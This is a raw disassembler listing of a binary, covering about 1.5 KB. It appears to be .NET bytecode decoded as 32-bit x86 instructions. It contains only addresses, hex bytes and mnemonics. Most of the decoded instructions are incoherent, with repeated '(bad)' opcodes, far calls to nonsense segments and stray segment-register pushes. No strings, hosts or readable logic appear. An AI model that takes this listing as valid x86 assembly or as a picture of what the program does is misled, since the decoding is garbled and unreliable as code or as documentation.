  403c4c:	00 00                	add    %al,(%eax)
  403c4e:	01 14 14             	add    %edx,(%esp,%edx,1)
  403c51:	14 28                	adc    $0x28,%al
  403c53:	ac                   	lods   %ds:(%esi),%al
  403c54:	00 00                	add    %al,(%eax)
  403c56:	0a 72 d4             	or     -0x2c(%edx),%dh
  403c59:	06                   	push   %es
  403c5a:	00 70 16             	add    %dh,0x16(%eax)
  403c5d:	28 ad 00 00 0a 2c    	sub    %ch,0x2c0a0000(%ebp)
  403c63:	66 7e 1b             	data16 jle 0x403c81
  403c66:	00 00                	add    %al,(%eax)
  403c68:	04 18                	add    $0x18,%al
  403c6a:	9a 28 b0 00 00 0a 2c 	lcall  $0x2c0a,$0xb028
  403c71:	4e                   	dec    %esi
  403c72:	07                   	pop    %es
  403c73:	14 72                	adc    $0x72,%al
  403c75:	86 06                	xchg   %al,(%esi)
  403c77:	00 70 18             	add    %dh,0x18(%eax)
  403c7a:	8d 03                	lea    (%ebx),%eax
  403c7c:	00 00                	add    %al,(%eax)
  403c7e:	01 13                	add    %edx,(%ebx)
  403c80:	08 11                	or     %dl,(%ecx)
  403c82:	08 16                	or     %dl,(%esi)
  403c84:	14 a2                	adc    $0xa2,%al
  403c86:	11 08                	adc    %ecx,(%eax)
  403c88:	17                   	pop    %ss
  403c89:	18 8d 03 00 00 01    	sbb    %cl,0x1000003(%ebp)
  403c8f:	13 09                	adc    (%ecx),%ecx
  403c91:	11 09                	adc    %ecx,(%ecx)
  403c93:	16                   	push   %ss
  403c94:	7e 1b                	jle    0x403cb1
  403c96:	00 00                	add    %al,(%eax)
  403c98:	04 18                	add    $0x18,%al
  403c9a:	9a a2 11 09 17 7e 1b 	lcall  $0x1b7e,$0x170911a2
  403ca1:	00 00                	add    %al,(%eax)
  403ca3:	04 19                	add    $0x19,%al
  403ca5:	9a 28 86 00 00 0a 28 	lcall  $0x280a,$0x8628
  403cac:	65 00 00             	add    %al,%gs:(%eax)
  403caf:	06                   	push   %es
  403cb0:	a2 11 09 a2 11       	mov    %al,0x11a20911
  403cb5:	08 14 14             	or     %dl,(%esp,%edx,1)
  403cb8:	14 17                	adc    $0x17,%al
  403cba:	28 75 00             	sub    %dh,0x0(%ebp)
  403cbd:	00 0a                	add    %cl,(%edx)
  403cbf:	26 dd 14 02          	fstl   %es:(%edx,%eax,1)
  403cc3:	00 00                	add    %al,(%eax)
  403cc5:	38 c8                	cmp    %cl,%al
  403cc7:	01 00                	add    %eax,(%eax)
  403cc9:	00 07                	add    %al,(%edi)
  403ccb:	14 72                	adc    $0x72,%al
  403ccd:	f8                   	clc
  403cce:	02 00                	add    (%eax),%al
  403cd0:	70 16                	jo     0x403ce8
  403cd2:	8d 03                	lea    (%ebx),%eax
  403cd4:	00 00                	add    %al,(%eax)
  403cd6:	01 14 14             	add    %edx,(%esp,%edx,1)
  403cd9:	14 28                	adc    $0x28,%al
  403cdb:	ac                   	lods   %ds:(%esi),%al
  403cdc:	00 00                	add    %al,(%eax)
  403cde:	0a 72 e2             	or     -0x1e(%edx),%dh
  403ce1:	06                   	push   %es
  403ce2:	00 70 16             	add    %dh,0x16(%eax)
  403ce5:	28 ad 00 00 0a 2c    	sub    %ch,0x2c0a0000(%ebp)
  403ceb:	55                   	push   %ebp
  403cec:	07                   	pop    %es
  403ced:	14 72                	adc    $0x72,%al
  403cef:	86 06                	xchg   %al,(%esi)
  403cf1:	00 70 18             	add    %dh,0x18(%eax)
  403cf4:	8d 03                	lea    (%ebx),%eax
  403cf6:	00 00                	add    %al,(%eax)
  403cf8:	01 13                	add    %edx,(%ebx)
  403cfa:	08 11                	or     %dl,(%ecx)
  403cfc:	08 16                	or     %dl,(%esi)
  403cfe:	14 a2                	adc    $0xa2,%al
  403d00:	11 08                	adc    %ecx,(%eax)
  403d02:	17                   	pop    %ss
  403d03:	17                   	pop    %ss
  403d04:	8d 03                	lea    (%ebx),%eax
  403d06:	00 00                	add    %al,(%eax)
  403d08:	01 13                	add    %edx,(%ebx)
  403d0a:	09 11                	or     %edx,(%ecx)
  403d0c:	09 16                	or     %edx,(%esi)
  403d0e:	7e 1b                	jle    0x403d2b
  403d10:	00 00                	add    %al,(%eax)
  403d12:	04 18                	add    $0x18,%al
  403d14:	9a 28 ae 00 00 0a 8c 	lcall  $0x8c0a,$0xae28
  403d1b:	6f                   	outsl  %ds:(%esi),(%dx)
  403d1c:	00 00                	add    %al,(%eax)
  403d1e:	01 a2 11 09 a2 11    	add    %esp,0x11a20911(%edx)
  403d24:	08 14 14             	or     %dl,(%esp,%edx,1)
  403d27:	14 28                	adc    $0x28,%al
  403d29:	ac                   	lods   %ds:(%esi),%al
  403d2a:	00 00                	add    %al,(%eax)
  403d2c:	0a 28                	or     (%eax),%ch
  403d2e:	22 00                	and    (%eax),%al
  403d30:	00 0a                	add    %cl,(%edx)
  403d32:	28 32                	sub    %dh,(%edx)
  403d34:	00 00                	add    %al,(%eax)
  403d36:	06                   	push   %es
  403d37:	dd 9d 01 00 00 38    	fstpl  0x38000001(%ebp)
  403d3d:	51                   	push   %ecx
  403d3e:	01 00                	add    %eax,(%eax)
  403d40:	00 07                	add    %al,(%edi)
  403d42:	14 72                	adc    $0x72,%al
  403d44:	f8                   	clc
  403d45:	02 00                	add    (%eax),%al
  403d47:	70 16                	jo     0x403d5f
  403d49:	8d 03                	lea    (%ebx),%eax
  403d4b:	00 00                	add    %al,(%eax)
  403d4d:	01 14 14             	add    %edx,(%esp,%edx,1)
  403d50:	14 28                	adc    $0x28,%al
  403d52:	ac                   	lods   %ds:(%esi),%al
  403d53:	00 00                	add    %al,(%eax)
  403d55:	0a 72 f2             	or     -0xe(%edx),%dh
  403d58:	06                   	push   %es
  403d59:	00 70 16             	add    %dh,0x16(%eax)
  403d5c:	28 ad 00 00 0a 39    	sub    %ch,0x390a0000(%ebp)
  403d62:	a7                   	cmpsl  %es:(%edi),%ds:(%esi)
  403d63:	00 00                	add    %al,(%eax)
  403d65:	00 7e 1b             	add    %bh,0x1b(%esi)
  403d68:	00 00                	add    %al,(%eax)
  403d6a:	04 18                	add    $0x18,%al
  403d6c:	9a 28 b1 00 00 0a 39 	lcall  $0x390a,$0xb128
  403d73:	91                   	xchg   %eax,%ecx
  403d74:	00 00                	add    %al,(%eax)
  403d76:	00 7e 1c             	add    %bh,0x1c(%esi)
  403d79:	00 00                	add    %al,(%eax)
  403d7b:	04 17                	add    $0x17,%al
  403d7d:	3b 81 00 00 00 17    	cmp    0x17000000(%ecx),%eax
  403d83:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403d87:	04 07                	add    $0x7,%al
  403d89:	14 72                	adc    $0x72,%al
  403d8b:	86 06                	xchg   %al,(%esi)
  403d8d:	00 70 18             	add    %dh,0x18(%eax)
  403d90:	8d 03                	lea    (%ebx),%eax
  403d92:	00 00                	add    %al,(%eax)
  403d94:	01 13                	add    %edx,(%ebx)
  403d96:	08 11                	or     %dl,(%ecx)
  403d98:	08 16                	or     %dl,(%esi)
  403d9a:	14 a2                	adc    $0xa2,%al
  403d9c:	11 08                	adc    %ecx,(%eax)
  403d9e:	17                   	pop    %ss
  403d9f:	1b 8d 03 00 00 01    	sbb    0x1000003(%ebp),%ecx
  403da5:	13 09                	adc    (%ecx),%ecx
  403da7:	11 09                	adc    %ecx,(%ecx)
  403da9:	16                   	push   %ss
  403daa:	28 61 00             	sub    %ah,0x0(%ecx)
  403dad:	00 06                	add    %al,(%esi)
  403daf:	a2 11 09 17 7e       	mov    %al,0x7e170911
  403db4:	1b 00                	sbb    (%eax),%eax
  403db6:	00 04 19             	add    %al,(%ecx,%ebx,1)
  403db9:	9a 28 86 00 00 0a 28 	lcall  $0x280a,$0x8628
  403dc0:	65 00 00             	add    %al,%gs:(%eax)
  403dc3:	06                   	push   %es
  403dc4:	a2 11 09 18 7e       	mov    %al,0x7e180911
  403dc9:	1b 00                	sbb    (%eax),%eax
  403dcb:	00 04 1a             	add    %al,(%edx,%ebx,1)
  403dce:	9a a2 11 09 19 7e 1b 	lcall  $0x1b7e,$0x190911a2
  403dd5:	00 00                	add    %al,(%eax)
  403dd7:	04 1b                	add    $0x1b,%al
  403dd9:	9a a2 11 09 1a 7e 1b 	lcall  $0x1b7e,$0x1a0911a2
  403de0:	00 00                	add    %al,(%eax)
  403de2:	04 1c                	add    $0x1c,%al
  403de4:	9a a2 11 09 a2 11 08 	lcall  $0x811,$0xa20911a2
  403deb:	14 14                	adc    $0x14,%al
  403ded:	14 28                	adc    $0x28,%al
  403def:	ac                   	lods   %ds:(%esi),%al
  403df0:	00 00                	add    %al,(%eax)
  403df2:	0a 28                	or     (%eax),%ch
  403df4:	22 00                	and    (%eax),%al
  403df6:	00 0a                	add    %cl,(%edx)
  403df8:	28 31                	sub    %dh,(%ecx)
  403dfa:	00 00                	add    %al,(%eax)
  403dfc:	06                   	push   %es
  403dfd:	18 80 1c 00 00 04    	sbb    %al,0x400001c(%eax)
  403e03:	dd d1                	fst    %st(1)
  403e05:	00 00                	add    %al,(%eax)
  403e07:	00 38                	add    %bh,(%eax)
  403e09:	85 00                	test   %eax,(%eax)
  403e0b:	00 00                	add    %al,(%eax)
  403e0d:	07                   	pop    %es
  403e0e:	14 72                	adc    $0x72,%al
  403e10:	f8                   	clc
  403e11:	02 00                	add    (%eax),%al
  403e13:	70 16                	jo     0x403e2b
  403e15:	8d 03                	lea    (%ebx),%eax
  403e17:	00 00                	add    %al,(%eax)
  403e19:	01 14 14             	add    %edx,(%esp,%edx,1)
  403e1c:	14 28                	adc    $0x28,%al
  403e1e:	ac                   	lods   %ds:(%esi),%al
  403e1f:	00 00                	add    %al,(%eax)
  403e21:	0a 72 fa             	or     -0x6(%edx),%dh
  403e24:	06                   	push   %es
  403e25:	00 70 16             	add    %dh,0x16(%eax)
  403e28:	28 ad 00 00 0a 2c    	sub    %ch,0x2c0a0000(%ebp)
  403e2e:	63 7e 1b             	arpl   %edi,0x1b(%esi)
  403e31:	00 00                	add    %al,(%eax)
  403e33:	04 18                	add    $0x18,%al
  403e35:	9a 28 b1 00 00 0a 2d 	lcall  $0x2d0a,$0xb128
  403e3c:	55                   	push   %ebp
  403e3d:	7e 1c                	jle    0x403e5b
  403e3f:	00 00                	add    %al,(%eax)
  403e41:	04 18                	add    $0x18,%al
  403e43:	33 4b 17             	xor    0x17(%ebx),%ecx
  403e46:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403e4a:	04 07                	add    $0x7,%al
  403e4c:	14 72                	adc    $0x72,%al
  403e4e:	86 06                	xchg   %al,(%esi)
  403e50:	00 70 18             	add    %dh,0x18(%eax)
  403e53:	8d 03                	lea    (%ebx),%eax
  403e55:	00 00                	add    %al,(%eax)
  403e57:	01 13                	add    %edx,(%ebx)
  403e59:	08 11                	or     %dl,(%ecx)
  403e5b:	08 16                	or     %dl,(%esi)
  403e5d:	14 a2                	adc    $0xa2,%al
  403e5f:	11 08                	adc    %ecx,(%eax)
  403e61:	17                   	pop    %ss
  403e62:	17                   	pop    %ss
  403e63:	8d 03                	lea    (%ebx),%eax
  403e65:	00 00                	add    %al,(%eax)
  403e67:	01 13                	add    %edx,(%ebx)
  403e69:	09 11                	or     %edx,(%ecx)
  403e6b:	09 16                	or     %edx,(%esi)
  403e6d:	28 61 00             	sub    %ah,0x0(%ecx)
  403e70:	00 06                	add    %al,(%esi)
  403e72:	a2 11 09 a2 11       	mov    %al,0x11a20911
  403e77:	08 14 14             	or     %dl,(%esp,%edx,1)
  403e7a:	14 28                	adc    $0x28,%al
  403e7c:	ac                   	lods   %ds:(%esi),%al
  403e7d:	00 00                	add    %al,(%eax)
  403e7f:	0a 28                	or     (%eax),%ch
  403e81:	22 00                	and    (%eax),%al
  403e83:	00 0a                	add    %cl,(%edx)
  403e85:	28 31                	sub    %dh,(%ecx)
  403e87:	00 00                	add    %al,(%eax)
  403e89:	06                   	push   %es
  403e8a:	16                   	push   %ss
  403e8b:	80 1c 00 00          	sbbb   $0x0,(%eax,%eax,1)
  403e8f:	04 de                	add    $0xde,%al
  403e91:	47                   	inc    %edi
  403e92:	11 06                	adc    %eax,(%esi)
  403e94:	17                   	pop    %ss
  403e95:	d6                   	salc
  403e96:	13 06                	adc    (%esi),%eax
  403e98:	11 06                	adc    %eax,(%esi)
  403e9a:	11 07                	adc    %eax,(%edi)
  403e9c:	8e b7 3f cc fb ff    	mov    -0x433c1(%edi),%?
  403ea2:	ff 11                	call   *(%ecx)
  403ea4:	04 17                	add    $0x17,%al
  403ea6:	d6                   	salc
  403ea7:	13 04 11             	adc    (%ecx,%edx,1),%eax
  403eaa:	04 11                	add    $0x11,%al
  403eac:	05 8e b7 3f 8e       	add    $0x8e3fb78e,%eax
  403eb1:	fb                   	sti
  403eb2:	ff                   	(bad)
  403eb3:	ff                   	lcall  (bad)
  403eb4:	de 23                	fisubs (%ebx)
  403eb6:	25 28 23 00 00       	and    $0x2328,%eax
  403ebb:	0a 0d 72 02 07 00    	or     0x70272,%cl
  403ec1:	70 09                	jo     0x403ecc
  403ec3:	6f                   	outsl  %ds:(%esi),(%dx)
  403ec4:	91                   	xchg   %eax,%ecx
  403ec5:	00 00                	add    %al,(%eax)
  403ec7:	0a 28                	or     (%eax),%ch
  403ec9:	1e                   	push   %ds
  403eca:	00 00                	add    %al,(%eax)
  403ecc:	0a 28                	or     (%eax),%ch
  403ece:	32 00                	xor    (%eax),%al
  403ed0:	00 06                	add    %al,(%esi)
  403ed2:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  403ed8:	00 2a                	add    %ch,(%edx)
  403eda:	00 00                	add    %al,(%eax)
  403edc:	41                   	inc    %ecx
  403edd:	1c 00                	sbb    $0x0,%al
	...
  403ee7:	00 8e 04 00 00 8e    	add    %cl,-0x71fffffc(%esi)
  403eed:	04 00                	add    $0x0,%al
  403eef:	00 23                	add    %ah,(%ebx)
  403ef1:	00 00                	add    %al,(%eax)
  403ef3:	00 26                	add    %ah,(%esi)
  403ef5:	00 00                	add    %al,(%eax)
  403ef7:	01 1b                	add    %ebx,(%ebx)
  403ef9:	30 03                	xor    %al,(%ebx)
  403efb:	00 26                	add    %ah,(%esi)
  403efd:	00 00                	add    %al,(%eax)
  403eff:	00 1f                	add    %bl,(%edi)
  403f01:	00 00                	add    %al,(%eax)
  403f03:	11 72 20             	adc    %esi,0x20(%edx)
  403f06:	07                   	pop    %es
  403f07:	00 70 7e             	add    %dh,0x7e(%eax)
  403f0a:	0a 00                	or     (%eax),%al
  403f0c:	00 04 02             	add    %al,(%edx,%eax,1)
  403f0f:	28 53 00             	sub    %dl,0x0(%ebx)
  403f12:	00 0a                	add    %cl,(%edx)
  403f14:	28 27                	sub    %ah,(%edi)
  403f16:	00 00                	add    %al,(%eax)
  403f18:	06                   	push   %es
  403f19:	de 0e                	fimuls (%esi)
  403f1b:	25 28 23 00 00       	and    $0x2328,%eax
  403f20:	0a 0a                	or     (%edx),%cl
  403f22:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  403f28:	00 2a                	add    %ch,(%edx)
  403f2a:	00 00                	add    %al,(%eax)
  403f2c:	01 10                	add    %edx,(%eax)
  403f2e:	00 00                	add    %al,(%eax)
  403f30:	00 00                	add    %al,(%eax)
  403f32:	00 00                	add    %al,(%eax)
  403f34:	17                   	pop    %ss
  403f35:	17                   	pop    %ss
  403f36:	00 0e                	add    %cl,(%esi)
  403f38:	26 00 00             	add    %al,%es:(%eax)
  403f3b:	01 1b                	add    %ebx,(%ebx)
  403f3d:	30 03                	xor    %al,(%ebx)
  403f3f:	00 26                	add    %ah,(%esi)
  403f41:	00 00                	add    %al,(%eax)
  403f43:	00 20                	add    %ah,(%eax)
  403f45:	00 00                	add    %al,(%eax)
  403f47:	11 72 0e             	adc    %esi,0xe(%edx)
  403f4a:	02 00                	add    (%eax),%al
  403f4c:	70 7e                	jo     0x403fcc
  403f4e:	0a 00                	or     (%eax),%al
  403f50:	00 04 02             	add    %al,(%edx,%eax,1)
  403f53:	28 53 00             	sub    %dl,0x0(%ebx)
  403f56:	00 0a                	add    %cl,(%edx)
  403f58:	28 27                	sub    %ah,(%edi)
  403f5a:	00 00                	add    %al,(%eax)
  403f5c:	06                   	push   %es
  403f5d:	de 0e                	fimuls (%esi)
  403f5f:	25 28 23 00 00       	and    $0x2328,%eax
  403f64:	0a 0a                	or     (%edx),%cl
  403f66:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  403f6c:	00 2a                	add    %ch,(%edx)
  403f6e:	00 00                	add    %al,(%eax)
  403f70:	01 10                	add    %edx,(%eax)
  403f72:	00 00                	add    %al,(%eax)
  403f74:	00 00                	add    %al,(%eax)
  403f76:	00 00                	add    %al,(%eax)
  403f78:	17                   	pop    %ss
  403f79:	17                   	pop    %ss
  403f7a:	00 0e                	add    %cl,(%esi)
  403f7c:	26 00 00             	add    %al,%es:(%eax)
  403f7f:	01 1b                	add    %ebx,(%ebx)
  403f81:	30 05 00 d4 00 00    	xor    %al,0xd400
  403f87:	00 21                	add    %ah,(%ecx)
  403f89:	00 00                	add    %al,(%eax)
  403f8b:	11 73 73             	adc    %esi,0x73(%ebx)
  403f8e:	00 00                	add    %al,(%eax)
  403f90:	06                   	push   %es
  403f91:	0a 06                	or     (%esi),%al
  403f93:	02 17                	add    (%edi),%dl
  403f95:	8d 2a                	lea    (%edx),%ebp
  403f97:	00 00                	add    %al,(%eax)
  403f99:	01 13                	add    %edx,(%ebx)
  403f9b:	07                   	pop    %es
  403f9c:	11 07                	adc    %eax,(%edi)
  403f9e:	16                   	push   %ss
  403f9f:	1f                   	pop    %ds
  403fa0:	3a 9d 11 07 6f 26    	cmp    0x266f0711(%ebp),%bl
  403fa6:	00 00                	add    %al,(%eax)
  403fa8:	0a 16                	or     (%esi),%dl
  403faa:	9a 7d 37 00 00 04 06 	lcall  $0x604,$0x377d
  403fb1:	02 17                	add    (%edi),%dl
  403fb3:	8d 2a                	lea    (%edx),%ebp
  403fb5:	00 00                	add    %al,(%eax)
  403fb7:	01 13                	add    %edx,(%ebx)
  403fb9:	07                   	pop    %es
  403fba:	11 07                	adc    %eax,(%edi)
  403fbc:	16                   	push   %ss
  403fbd:	1f                   	pop    %ds
  403fbe:	3a 9d 11 07 6f 26    	cmp    0x266f0711(%ebp),%bl
  403fc4:	00 00                	add    %al,(%eax)
  403fc6:	0a 17                	or     (%edi),%dl
  403fc8:	9a 7d 38 00 00 04 02 	lcall  $0x204,$0x387d
  403fcf:	17                   	pop    %ss
  403fd0:	8d 2a                	lea    (%edx),%ebp
  403fd2:	00 00                	add    %al,(%eax)
  403fd4:	01 13                	add    %edx,(%ebx)
  403fd6:	07                   	pop    %es
  403fd7:	11 07                	adc    %eax,(%edi)
  403fd9:	16                   	push   %ss
  403fda:	1f                   	pop    %ds
  403fdb:	3a 9d 11 07 6f 26    	cmp    0x266f0711(%ebp),%bl
  403fe1:	00 00                	add    %al,(%eax)
  403fe3:	0a 18                	or     (%eax),%bl
  403fe5:	9a 28 ae 00 00 0a 1f 	lcall  $0x1f0a,$0xae28
  403fec:	3c d8                	cmp    $0xd8,%al
  403fee:	0c 08                	or     $0x8,%al
  403ff0:	6c                   	insb   (%dx),%es:(%edi)
  403ff1:	28 b2 00 00 0a 0d    	sub    %dh,0xd0a0000(%edx)
  403ff7:	73 b3                	jae    0x403fac
  403ff9:	00 00                	add    %al,(%eax)
  403ffb:	0a 0b                	or     (%ebx),%cl
  403ffd:	07                   	pop    %es
  403ffe:	6f                   	outsl  %ds:(%esi),(%dx)
  403fff:	b4 00                	mov    $0x0,%ah
  404001:	00 0a                	add    %cl,(%edx)
  404003:	2b 34 16             	sub    (%esi,%edx,1),%esi
  404006:	13 05 06 25 fe 07    	adc    0x7fe2506,%eax
  40400c:	74 00                	je     0x40400e
  40400e:	00 06                	add    %al,(%esi)
  404010:	73 27                	jae    0x404039
  404012:	00 00                	add    %al,(%eax)
  404014:	0a 73 28             	or     0x28(%ebx),%dh
  404017:	00 00                	add    %al,(%eax)
  404019:	0a 13                	or     (%ebx),%dl
  40401b:	04 11                	add    $0x11,%al
  40401d:	04 6f                	add    $0x6f,%al
  40401f:	29 00                	sub    %eax,(%eax)
  404021:	00 0a                	add    %cl,(%edx)
  404023:	11 05 17 d6 13 05    	adc    %eax,0x513d617
  404029:	11 05 1f 13 31 d9    	adc    %eax,0xd931131f
  40402f:	20 88 13 00 00 28    	and    %cl,0x28000013(%eax)
  404035:	21 00                	and    %eax,(%eax)
  404037:	00 0a                	add    %cl,(%edx)
  404039:	09 07                	or     %eax,(%edi)
  40403b:	6f                   	outsl  %ds:(%esi),(%dx)
  40403c:	b5 00                	mov    $0x0,%ch
  40403e:	00 0a                	add    %cl,(%edx)
  404040:	28 b6 00 00 0a 2c    	sub    %dh,0x2c0a0000(%esi)
  404046:	07                   	pop    %es
  404047:	7e 10                	jle    0x404059
  404049:	00 00                	add    %al,(%eax)
  40404b:	04 2d                	add    $0x2d,%al
  40404d:	b7 de                	mov    $0xde,%bh
  40404f:	0f 25                	(bad)
  404051:	28 23                	sub    %ah,(%ebx)
  404053:	00 00                	add    %al,(%eax)
  404055:	0a 13                	or     (%ebx),%dl
  404057:	06                   	push   %es
  404058:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  40405e:	00 2a                	add    %ch,(%edx)
  404060:	01 10                	add    %edx,(%eax)
  404062:	00 00                	add    %al,(%eax)
  404064:	00 00                	add    %al,(%eax)
  404066:	00 00                	add    %al,(%eax)
  404068:	c4                   	(bad)
  404069:	c4 00                	les    (%eax),%eax
  40406b:	0f 26 00             	mov    %eax,%tr0
  40406e:	00 01                	add    %al,(%ecx)
  404070:	13 30                	adc    (%eax),%esi
  404072:	08 00                	or     %al,(%eax)
  404074:	e3 00                	jecxz  0x404076
  404076:	00 00                	add    %al,(%eax)
  404078:	22 00                	and    (%eax),%al
  40407a:	00 11                	add    %dl,(%ecx)
  40407c:	73 b7                	jae    0x404035
  40407e:	00 00                	add    %al,(%eax)
  404080:	0a 0c 02             	or     (%edx,%eax,1),%cl
  404083:	72 a2                	jb     0x404027
  404085:	02 00                	add    (%eax),%al
  404087:	70 15                	jo     0x40409e
  404089:	16                   	push   %ss
  40408a:	28 83 00 00 0a 13    	sub    %al,0x130a0000(%ebx)
  404090:	05 16 13 04 2b       	add    $0x2b041316,%eax
  404095:	2c 11                	sub    $0x11,%al
  404097:	05 11 04 9a 0b       	add    $0xb9a0411,%eax
  40409c:	08 07                	or     %al,(%edi)
  40409e:	14 72                	adc    $0x72,%al
  4040a0:	28 07                	sub    %al,(%edi)
  4040a2:	00 70 16             	add    %dh,0x16(%eax)
  4040a5:	8d 03                	lea    (%ebx),%eax
  4040a7:	00 00                	add    %al,(%eax)
  4040a9:	01 14 14             	add    %edx,(%esp,%edx,1)
  4040ac:	14 28                	adc    $0x28,%al
  4040ae:	ac                   	lods   %ds:(%esi),%al
  4040af:	00 00                	add    %al,(%eax)
  4040b1:	0a 28                	or     (%eax),%ch
  4040b3:	22 00                	and    (%eax),%al
  4040b5:	00 0a                	add    %cl,(%edx)
  4040b7:	6f                   	outsl  %ds:(%esi),(%dx)
  4040b8:	b8 00 00 0a 11       	mov    $0x110a0000,%eax
  4040bd:	04 17                	add    $0x17,%al
  4040bf:	d6                   	salc
  4040c0:	13 04 11             	adc    (%ecx,%edx,1),%eax
  4040c3:	04 11                	add    $0x11,%al
  4040c5:	05 8e b7 32 cc       	add    $0xcc32b78e,%eax
  4040ca:	1f                   	pop    %ds
  4040cb:	1e                   	push   %ds
  4040cc:	0a 38                	or     (%eax),%bh
  4040ce:	82 00 00             	addb   $0x0,(%eax)
  4040d1:	00 28                	add    %ch,(%eax)
  4040d3:	b9 00 00 0a 13       	mov    $0x130a0000,%ecx
  4040d8:	07                   	pop    %es
  4040d9:	16                   	push   %ss
  4040da:	13 06                	adc    (%esi),%eax
  4040dc:	2b 60 11             	sub    0x11(%eax),%esp
  4040df:	07                   	pop    %es
  4040e0:	11 06                	adc    %eax,(%esi)
  4040e2:	9a 0d 09 6f ba 00 00 	lcall  $0x0,$0xba6f090d
  4040e9:	0a 28                	or     (%eax),%ch
  4040eb:	bb 00 00 0a 2c       	mov    $0x2c0a0000,%ebx
  4040f0:	02 2b                	add    (%ebx),%ch
  4040f2:	45                   	inc    %ebp
  4040f3:	08 09                	or     %cl,(%ecx)
  4040f5:	6f                   	outsl  %ds:(%esi),(%dx)
  4040f6:	ba 00 00 0a 6f       	mov    $0x6f0a0000,%edx
  4040fb:	bc 00 00 0a 25       	mov    $0x250a0000,%esp
  404100:	fe 07                	incb   (%edi)
  404102:	bd 00 00 0a 73       	mov    $0x730a0000,%ebp
  404107:	be 00 00 0a 28       	mov    $0x280a0000,%esi
  40410c:	03 00                	add    (%eax),%eax
  40410e:	00 2b                	add    %ch,(%ebx)
  404110:	2c 26                	sub    $0x26,%al
  404112:	06                   	push   %es
  404113:	1f                   	pop    %ds
  404114:	1e                   	push   %ds
  404115:	31 21                	xor    %esp,(%ecx)
  404117:	16                   	push   %ss
  404118:	0a 72 38             	or     0x38(%edx),%dh
  40411b:	07                   	pop    %es
  40411c:	00 70 09             	add    %dh,0x9(%eax)
  40411f:	6f                   	outsl  %ds:(%esi),(%dx)
  404120:	ba 00 00 0a 6f       	mov    $0x6f0a0000,%edx
  404125:	bc 00 00 0a 72       	mov    $0x720a0000,%esp
  40412a:	46                   	inc    %esi
  40412b:	07                   	pop    %es
  40412c:	00 70 28             	add    %dh,0x28(%eax)
  40412f:	53                   	push   %ebx
  404130:	00 00                	add    %al,(%eax)
  404132:	0a 28                	or     (%eax),%ch
  404134:	31 00                	xor    %eax,(%eax)
  404136:	00 06                	add    %al,(%esi)
  404138:	11 06                	adc    %eax,(%esi)
  40413a:	17                   	pop    %ss
  40413b:	d6                   	salc
  40413c:	13 06                	adc    (%esi),%eax
  40413e:	11 06                	adc    %eax,(%esi)
  404140:	11 07                	adc    %eax,(%edi)
  404142:	8e b7 32 98 06 17    	mov    0x17069832(%edi),%?
  404148:	d6                   	salc
  404149:	0a 20                	or     (%eax),%ah
  40414b:	e8 03 00 00 28       	call   0x28404153
  404150:	21 00                	and    %eax,(%eax)
  404152:	00 0a                	add    %cl,(%edx)
  404154:	7e 10                	jle    0x404166
  404156:	00 00                	add    %al,(%eax)
  404158:	04 3a                	add    $0x3a,%al
  40415a:	74 ff                	je     0x40415b
  40415c:	ff                   	(bad)
  40415d:	ff 2a                	ljmp   *(%edx)
  40415f:	00 1b                	add    %bl,(%ebx)
  404161:	30 04 00             	xor    %al,(%eax,%eax,1)
  404164:	96                   	xchg   %eax,%esi
  404165:	00 00                	add    %al,(%eax)
  404167:	00 23                	add    %ah,(%ebx)
  404169:	00 00                	add    %al,(%eax)
  40416b:	11 03                	adc    %eax,(%ebx)
  40416d:	39 88 00 00 00 17    	cmp    %ecx,0x17000000(%eax)
  404173:	28 2b                	sub    %ch,(%ebx)
  404175:	00 00                	add    %al,(%eax)
  404177:	0a 20                	or     (%eax),%ah
  404179:	00 0c 00             	add    %cl,(%eax,%eax,1)
  40417c:	00 28                	add    %ch,(%eax)
  40417e:	2c 00                	sub    $0x0,%al
  404180:	00 0a                	add    %cl,(%edx)
  404182:	20 0f                	and    %cl,(%edi)
  404184:	27                   	daa
  404185:	00 00                	add    %al,(%eax)
  404187:	28 2d 00 00 0a de    	sub    %ch,0xde0a0000
  40418d:	0c 28                	or     $0x28,%al
  40418f:	23 00                	and    (%eax),%eax
  404191:	00 0a                	add    %cl,(%edx)
  404193:	28 25 00 00 0a de    	sub    %ah,0xde0a0000
  404199:	00 02                	add    %al,(%edx)
  40419b:	28 c0                	sub    %al,%al
  40419d:	00 00                	add    %al,(%eax)
  40419f:	0a 74 75 00          	or     0x0(%ebp,%esi,2),%dh
  4041a3:	00 01                	add    %al,(%ecx)
  4041a5:	0a 06                	or     (%esi),%al
  4041a7:	7e 2f                	jle    0x4041d8
  4041a9:	00 00                	add    %al,(%eax)
  4041ab:	04 73                	add    $0x73,%al
  4041ad:	31 00                	xor    %eax,(%eax)
  4041af:	00 0a                	add    %cl,(%edx)
  4041b1:	7e 2f                	jle    0x4041e2
  4041b3:	00 00                	add    %al,(%eax)
  4041b5:	04 8e                	add    $0x8e,%al
  4041b7:	b7 6f                	mov    $0x6f,%bh
  4041b9:	c1 00 00             	roll   $0x0,(%eax)
  4041bc:	0a 9a 6f c2 00 00    	or     0xc26f(%edx),%bl
  4041c2:	0a 06                	or     (%esi),%al
  4041c4:	17                   	pop    %ss
  4041c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4041c6:	c3                   	ret
  4041c7:	00 00                	add    %al,(%eax)
  4041c9:	0a 06                	or     (%esi),%al
  4041cb:	20 10                	and    %dl,(%eax)
  4041cd:	27                   	daa
  4041ce:	00 00                	add    %al,(%eax)
  4041d0:	6f                   	outsl  %ds:(%esi),(%dx)
  4041d1:	c4 00                	les    (%eax),%eax
  4041d3:	00 0a                	add    %cl,(%edx)
  4041d5:	06                   	push   %es
  4041d6:	72 4a                	jb     0x404222
  4041d8:	07                   	pop    %es
  4041d9:	00 70 6f             	add    %dh,0x6f(%eax)
  4041dc:	c5 00                	lds    (%eax),%eax
  4041de:	00 0a                	add    %cl,(%edx)
  4041e0:	06                   	push   %es
  4041e1:	6f                   	outsl  %ds:(%esi),(%dx)
  4041e2:	c6 00 00             	movb   $0x0,(%eax)
  4041e5:	0a 74 76 00          	or     0x0(%esi,%esi,2),%dh
  4041e9:	00 01                	add    %al,(%ecx)
  4041eb:	0b de                	or     %esi,%ebx
  4041ed:	0a 07                	or     (%edi),%al
  4041ef:	2c 06                	sub    $0x6,%al
  4041f1:	07                   	pop    %es
